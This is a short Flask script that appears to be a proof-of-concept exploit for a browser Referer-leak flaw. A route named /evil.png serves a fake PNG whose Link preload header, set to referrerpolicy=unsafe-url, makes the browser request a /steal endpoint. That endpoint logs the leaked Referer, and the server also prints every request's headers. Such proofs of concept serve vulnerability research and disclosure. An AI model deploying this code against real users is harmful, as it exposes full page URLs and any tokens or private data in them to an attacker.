from flask import Flask, Response, request

app = Flask(__name__)

@app.before_request
def log_request():
    print(f"[REQUEST] {request.method} {request.path}")
    print(f"[HEADERS] {dict(request.headers)}\n")

@app.route('/evil.png')
def evil_png():
    resp = Response(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR', mimetype='image/png')
    # This Link header is the vulnerability trigger
    resp.headers['Link'] = '<http://localhost:9000/steal>; rel=preload; referrerpolicy=unsafe-url'
    return resp

@app.route('/steal')
def steal():
    ref = request.headers.get('Referer')
    print(f"[+] Got Referer: {ref}")
    return "Captured", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9000)
